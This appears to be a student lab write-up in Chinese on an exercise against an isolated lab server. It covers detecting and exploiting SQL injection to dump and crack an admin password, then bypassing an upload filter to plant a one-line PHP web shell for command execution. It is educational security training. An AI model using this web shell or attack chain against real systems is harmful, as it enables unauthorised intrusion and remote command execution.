# 实验三	from sql to shell

## 环境搭建

* 攻击者主机环境：
  * host-only
  * ![text](attacker.png)
* 网站服务器ip
  * ![text](victim.png)

## 实验过程

* 攻击者主机浏览器设置代理

  * ![text](proxy.png)
  * 访问192.168.137.69
    * ![text](origin.png)
  * 使用burpsuite查看通信数据,得到服务器的版本及php版本信息
    * ![text](response.png)

* 检测SQL注入

  * 查看id=1和id=2-1结果相同，猜测sql注入可行。
    * ![text](id=1.png)
  * ![text](id=2-1.png)

* 进行SQL注入

  * 字符串拼接union select 测试出列数为4.
    * ![text](test.png)
    * ![text](test-success.png)
  * 查看数据库版本信息
    * ![text](version.png)
  * 查看当前用户
    * ![text](curuser.png)
  * 查看所有表名
    * ![text](user.png)
  * 查看user表中的用户名和密码
    * ![text](adminis's passwd&user.png)
    * 获得密码后，使用md5解密
      * ![text](decrypy.png)
    * 使用用户名密码成功登录管理员账户
      * ![text](success-login.png)

* 文件上传 

  * 尝试上传php脚本

    * ![text](no-php!.png)

  * 绕过php过滤。直接修改后缀重新上传

    * php文件：

      * ```php
        <?php
             system($_GET['cmd']);
        ?>
        ```

      * 点击查看源代码可以看到php文件存储路径：

        * ![text](shell.png)
        * 点击进入页面。构造输入串，实现直接在服务器终端操作。
          * ![text](ls.png)

* ​